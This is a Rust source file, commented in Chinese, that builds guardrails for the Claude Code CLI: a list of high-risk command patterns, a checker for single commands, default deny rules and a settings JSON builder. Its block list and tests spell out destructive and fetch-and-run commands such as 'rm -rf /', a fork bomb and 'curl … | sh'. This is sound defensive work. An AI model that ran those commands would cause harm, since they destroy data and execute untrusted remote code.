//! 护栏：高风险命令分类 + 生成传给 `claude --settings` 的权限 JSON。
//!
//! 「放行 + 护栏」策略：
//! - `permissions.defaultMode = acceptEdits`（放行可恢复/轻动作）。
//! - `permissions.deny` 声明式拦截高风险工具调用（跨平台、稳）。
//! - 运行级 git 快照由运行器在启动前做（见 `mod.rs::create_git_snapshot`）。
//!
//! [`is_high_risk_command`] 供「Claude 控制台」等场景对**单条命令**做本地预检/展示用，
//! 与 CLI 侧的 deny 规则互为补充。

/// 高风险子串（已小写）→ 原因。命中任一即判为高风险。
pub const HIGH_RISK_PATTERNS: &[(&str, &str)] = &[
    ("rm -rf", "递归强制删除"),
    ("rm -fr", "递归强制删除"),
    ("sudo ", "提权执行"),
    ("git push --force", "强制推送会覆盖远端历史"),
    ("git push -f", "强制推送会覆盖远端历史"),
    ("git reset --hard", "硬重置会丢弃未提交改动"),
    ("git clean -fd", "强制清理未跟踪文件"),
    ("mkfs", "格式化文件系统"),
    ("dd if=", "裸盘写入"),
    (":(){", "fork 炸弹"),
    ("shutdown", "关机"),
    ("reboot", "重启"),
    ("> /dev/sd", "直接写入块设备"),
    ("| sh", "管道执行远程脚本"),
    ("|sh", "管道执行远程脚本"),
    ("| bash", "管道执行远程脚本"),
    ("|bash", "管道执行远程脚本"),
    ("chmod -r 777 /", "危险的全局权限修改"),
    ("chown -r", "递归改所有权"),
];

/// 若命令命中高风险模式，返回原因；否则 `None`。
pub fn is_high_risk_command(command: &str) -> Option<&'static str> {
    let lowered = command.to_lowercase();
    HIGH_RISK_PATTERNS
        .iter()
        .find(|(pat, _)| lowered.contains(pat))
        .map(|(_, reason)| *reason)
}

/// CLI `--settings` 默认的 `permissions.deny` 规则（Claude Code 工具说明符语法）。
pub fn default_deny_rules() -> Vec<String> {
    vec![
        "Bash(rm -rf:*)".into(),
        "Bash(rm -fr:*)".into(),
        "Bash(sudo:*)".into(),
        "Bash(git push --force:*)".into(),
        "Bash(git push -f:*)".into(),
        "Bash(git reset --hard:*)".into(),
        "Bash(git clean -fd:*)".into(),
        "Bash(mkfs:*)".into(),
        "Bash(dd:*)".into(),
        "Bash(shutdown:*)".into(),
        "Bash(reboot:*)".into(),
        "Edit(.env)".into(),
        "Edit(.git/**)".into(),
    ]
}

/// 生成护栏 settings JSON。`mode` 为 `--permission-mode` 同名取值；
/// `extra_deny` 追加在默认 deny 之后。
pub fn build_guard_settings_json(mode: &str, extra_deny: &[String]) -> serde_json::Value {
    let mut deny = default_deny_rules();
    deny.extend(extra_deny.iter().cloned());
    serde_json::json!({
        "permissions": {
            "defaultMode": mode,
            "deny": deny,
        }
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn flags_rm_rf_regardless_of_case_and_spacing() {
        assert!(is_high_risk_command("rm -rf /tmp/x").is_some());
        assert!(is_high_risk_command("RM -RF /").is_some());
        assert!(is_high_risk_command("sudo apt install").is_some());
        assert!(is_high_risk_command("git push --force origin main").is_some());
    }

    #[test]
    fn flags_pipe_to_shell() {
        assert!(is_high_risk_command("curl http://x | sh").is_some());
        assert!(is_high_risk_command("wget -qO- x|bash").is_some());
    }

    #[test]
    fn allows_ordinary_reversible_commands() {
        assert!(is_high_risk_command("ls -la").is_none());
        assert!(is_high_risk_command("git status").is_none());
        assert!(is_high_risk_command("pbcopy < file.txt").is_none());
        assert!(is_high_risk_command("echo hi").is_none());
    }

    #[test]
    fn guard_settings_has_accept_edits_and_deny_list() {
        let v = build_guard_settings_json("acceptEdits", &[]);
        assert_eq!(v["permissions"]["defaultMode"], "acceptEdits");
        let deny = v["permissions"]["deny"].as_array().unwrap();
        assert!(deny.iter().any(|d| d == "Bash(rm -rf:*)"));
        assert!(deny.iter().any(|d| d == "Bash(sudo:*)"));
    }

    #[test]
    fn guard_settings_appends_extra_deny() {
        let extra = vec!["Bash(npm publish:*)".to_string()];
        let v = build_guard_settings_json("acceptEdits", &extra);
        let deny = v["permissions"]["deny"].as_array().unwrap();
        assert!(deny.iter().any(|d| d == "Bash(npm publish:*)"));
    }
}
